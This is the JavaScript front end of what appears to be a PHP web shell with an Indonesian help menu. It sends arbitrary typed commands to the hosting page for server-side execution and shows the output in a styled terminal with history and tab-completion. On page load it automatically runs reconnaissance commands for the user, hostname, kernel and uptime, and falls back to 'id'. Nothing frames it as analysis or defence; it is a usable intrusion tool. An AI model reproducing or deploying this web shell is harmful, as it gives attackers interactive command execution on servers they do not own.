<script>
// ===== STATE =====
const state = {
    history: [],
    historyIdx: -1,
    cwd: '<?= addslashes($cwd) ?>',
    prompt: '<?= addslashes(generatePrompt($cwd)) ?>',
    processing: false,
    tabSug: [],
    tabIdx: 0,
    tabPressed: false,
    theme: 'dark'
};

// ===== DOM REFS =====
const output = document.getElementById('output-content');
const input = document.getElementById('cmd-input');
const promptEl = document.getElementById('prompt-display');
const autoEl = document.getElementById('autocomplete');
const termBody = document.getElementById('terminal-body');

// ===== UTILITIES =====
function scrollBottom() {
    const el = document.getElementById('output');
    requestAnimationFrame(() => { el.scrollTop = el.scrollHeight; });
}

function addLine(text, cls = 'out') {
    const div = document.createElement('div');
    div.className = 'line ' + cls;
    div.textContent = text;
    output.appendChild(div);
    scrollBottom();
    return div;
}

function setPrompt(p) {
    state.prompt = p;
    promptEl.textContent = p;
}

// ===== SMART OUTPUT =====
function smartOutput(text) {
    const lines = text.replace(/\n$/, '').split('\n');
    lines.forEach(l => {
        const lower = l.toLowerCase();
        if (lower.includes('error') || lower.includes('not found') || lower.includes('denied') || lower.includes('failed') || lower.includes('cannot') || lower.includes('no such')) {
            addLine(l, 'out error');
        } else if (lower.includes('success') || lower.includes('connected') || l.startsWith('uid=')) {
            addLine(l, 'out success');
        } else if (lower.includes('warning') || lower.includes('notice')) {
            addLine(l, 'out warning');
        } else if (lower.startsWith('linux') || lower.includes('gnu/') || lower.includes('architecture') || lower.includes('processor')) {
            addLine(l, 'out info');
        } else {
            addLine(l, 'out');
        }
    });
}

// ===== SEND COMMAND =====
function sendCmd() {
    if (state.processing) return;
    const cmd = input.value.trim();
    if (!cmd) return;
    
    state.history.push(cmd);
    state.historyIdx = state.history.length;
    
    addLine(state.prompt + cmd, 'cmd');
    input.value = '';
    
    // Built-in
    if (cmd.toLowerCase() === 'help') {
        addLine('╔══════════════════════════════════════════════════════╗', 'out info');
        addLine('║  Semua perintah Linux standar tersedia            ║', 'out info');
        addLine('║  cd [dir]     — Pindah direktori                 ║', 'out info');
        addLine('║  clear        — Bersihkan layar                  ║', 'out info');
        addLine('║  help         — Tampilkan bantuan                ║', 'out info');
        addLine('║  history      — Riwayat perintah                 ║', 'out info');
        addLine('║  pwd          — Direktori saat ini               ║', 'out info');
        addLine('║  whoami       — User saat ini                    ║', 'out info');
        addLine('║  id           — Informasi user                   ║', 'out info');
        addLine('║  uname -a     — Info sistem                      ║', 'out info');
        addLine('║  df -h        — Disk usage                       ║', 'out info');
        addLine('║  free -h      — Memory usage                     ║', 'out info');
        addLine('║  ps aux       — Proses berjalan                  ║', 'out info');
        addLine('║  ls -la       — List file detail                 ║', 'out info');
        addLine('║  exit         — Keluar                           ║', 'out info');
        addLine('╚══════════════════════════════════════════════════════╝', 'out info');
        setPrompt(state.prompt);
        input.focus();
        return;
    }
    
    if (cmd.toLowerCase() === 'history') {
        state.history.forEach((c, i) => addLine(`  ${i+1}  ${c}`, 'out'));
        setPrompt(state.prompt);
        input.focus();
        return;
    }
    
    if (cmd.toLowerCase() === 'exit') {
        addLine('logout', 'out warning');
        setTimeout(() => window.location.href = window.location.pathname, 600);
        return;
    }
    
    state.processing = true;
    const fd = new FormData();
    fd.append('cmd', cmd);
    fd.append('cwd', state.cwd);
    
    fetch(window.location.href, { method: 'POST', body: fd })
    .then(r => r.json())
    .then(d => {
        if (d.output === '__CLEAR__') {
            output.innerHTML = '';
        } else if (d.output) {
            smartOutput(d.output);
        }
        state.cwd = d.cwd;
        setPrompt(d.prompt);
        state.processing = false;
        input.focus();
    })
    .catch(e => {
        addLine('Error: ' + e.message, 'out error');
        state.processing = false;
        input.focus();
    });
}

// ===== AUTOCOMPLETE =====
function fetchAutocomplete(partial) {
    if (!partial.trim()) { autoEl.style.display = 'none'; return; }
    const fd = new FormData();
    fd.append('autocomplete', '1');
    fd.append('partial', partial);
    fd.append('cwd', state.cwd);
    fetch(window.location.href, { method: 'POST', body: fd })
    .then(r => r.json())
    .then(sug => {
        if (sug.length) {
            state.tabSug = sug;
            state.tabIdx = 0;
            renderAutoComplete(sug, 0);
        } else {
            autoEl.style.display = 'none';
        }
    });
}

function renderAutoComplete(items, sel) {
    autoEl.innerHTML = '';
    items.forEach((s, i) => {
        const d = document.createElement('div');
        d.className = 'ac-item' + (i === sel ? ' selected' : '');
        const isDir = s.endsWith('/');
        d.innerHTML = escapeHtml(s) + (isDir ? ' <span class="tag">dir</span>' : ' <span class="tag">cmd</span>');
        d.onclick = () => { input.value = s; autoEl.style.display = 'none'; input.focus(); };
        autoEl.appendChild(d);
    });
    autoEl.style.display = 'block';
}

function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// ===== KEYBOARD =====
input.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        autoEl.style.display = 'none';
        sendCmd();
        state.tabPressed = false;
    }
    else if (e.key === 'ArrowUp') {
        e.preventDefault();
        autoEl.style.display = 'none';
        if (state.historyIdx > 0) {
            state.historyIdx--;
            this.value = state.history[state.historyIdx];
        }
        state.tabPressed = false;
    }
    else if (e.key === 'ArrowDown') {
        e.preventDefault();
        autoEl.style.display = 'none';
        if (state.historyIdx < state.history.length - 1) {
            state.historyIdx++;
            this.value = state.history[state.historyIdx];
        } else {
            state.historyIdx = state.history.length;
            this.value = '';
        }
        state.tabPressed = false;
    }
    else if (e.key === 'Tab') {
        e.preventDefault();
        const val = this.value.trim();
        if (!state.tabPressed && val) {
            fetchAutocomplete(val);
            state.tabPressed = true;
            state.tabIdx = 0;
        } else if (state.tabPressed && state.tabSug.length) {
            state.tabIdx = (state.tabIdx + 1) % state.tabSug.length;
            renderAutoComplete(state.tabSug, state.tabIdx);
            this.value = state.tabSug[state.tabIdx];
        }
    }
    else if (e.key === 'Escape') {
        autoEl.style.display = 'none';
        state.tabPressed = false;
    }
    else if (e.key === 'l' && e.ctrlKey) {
        e.preventDefault();
        output.innerHTML = '';
        state.tabPressed = false;
    }
    else if (e.key === 'c' && e.ctrlKey) {
        e.preventDefault();
        addLine('^C', 'out warning');
        setPrompt(state.prompt);
        state.processing = false;
        state.tabPressed = false;
    }
    else if (e.key === 'd' && e.ctrlKey) {
        e.preventDefault();
        addLine('logout', 'out warning');
        setTimeout(() => window.location.href = window.location.pathname, 600);
    }
    else {
        state.tabPressed = false;
        setTimeout(() => autoEl.style.display = 'none', 150);
    }
});

input.addEventListener('input', function() {
    state.tabPressed = false;
});

// ===== CLICK TO FOCUS =====
termBody.addEventListener('click', () => input.focus());

// ===== INIT =====
window.addEventListener('load', () => {
    input.focus();
    
    // Ambil info sistem
    const fd = new FormData();
    fd.append('cmd', 'echo "User: $(whoami) | Host: $(hostname) | OS: $(uname -s) $(uname -r) | Uptime: $(uptime -p | sed "s/up //")"');
    fd.append('cwd', state.cwd);
    
    fetch(window.location.href, { method: 'POST', body: fd })
    .then(r => r.json())
    .then(d => {
        if (d.output) {
            smartOutput('╭─ System Info ──────────────────────────────');
            smartOutput(d.output.replace(/\n$/, ''));
            smartOutput('╰────────────────────────────────────────────');
            state.cwd = d.cwd;
            setPrompt(d.prompt);
        }
    })
    .catch(() => {
        // Fallback: coba id
        const fd2 = new FormData();
        fd2.append('cmd', 'id');
        fd2.append('cwd', state.cwd);
        fetch(window.location.href, { method: 'POST', body: fd2 })
        .then(r => r.json())
        .then(d => {
            if (d.output) smartOutput(d.output.replace(/\n$/, ''), 'out success');
            state.cwd = d.cwd;
            setPrompt(d.prompt);
        });
    });
});
